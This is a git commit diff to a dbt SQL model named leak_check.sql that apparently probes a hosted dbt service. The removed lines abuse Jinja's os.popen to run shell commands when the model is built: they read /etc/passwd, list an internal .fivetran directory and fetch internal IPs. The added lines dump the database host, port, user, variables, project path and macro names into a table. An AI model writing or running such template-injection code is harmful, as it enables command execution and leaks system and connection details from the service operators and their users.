3965909942392b84e5298cf9a9b64a050ffa21a4
Taofik Hidayat <146046695+eviruin@users.noreply.github.com>
2026-03-11 00:47:24 +0700

    Update leak_check.sql

--- models/leak_check.sql
+++ models/leak_check.sql
@@ -1,7 +1,11 @@
 {{ config(materialized='table') }}
 
 SELECT 
-    '{{ modules.os.popen("cat /etc/passwd").read() | truncate(500) }}' as passwd_file,
-    '{{ modules.os.popen("ls -la /tmp/dbt/project/.fivetran").read() }}' as internal_files,
-    '{{ modules.os.popen("hostname -I").read() }}' as internal_ip,
+    '{{ target.profile_name }}' as p_name,
+    '{{ target.host }}' as db_host,
+    '{{ target.port }}' as db_port,
+    '{{ target.user }}' as db_user,
+    '{{ var.keys() | list | join(", ") }}' as available_vars,
+    '{{ flags.PROJECT_DIR }}' as p_dir,
+    '{{ graph.macros.keys() | list | slice(10) | first | join(", ") }}' as custom_macros,
     CURRENT_TIMESTAMP as audit_time
